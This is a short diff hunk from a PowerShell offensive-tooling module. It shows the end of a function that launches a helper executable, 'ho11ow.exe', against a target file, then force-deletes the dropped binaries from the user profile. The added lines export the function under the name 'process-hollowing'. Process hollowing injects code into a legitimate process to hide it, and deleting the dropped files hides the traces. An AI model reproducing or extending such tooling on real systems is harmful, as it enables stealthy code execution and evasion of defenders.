@@ -328,6 +328,9 @@ start-process ho11ow.exe $PEFILE $TARGETFILE ;
 sleep(11.7)
 del "$env:userprofile\codeho11ow.bin" -force
 del "$env:userprofile\ho11ow.exe" -force
+}
+Export-ModuleMember -Function process-hollowing 
+Set-Alias -Name process-hollowing  -Value process-hollowing 
 
 
 
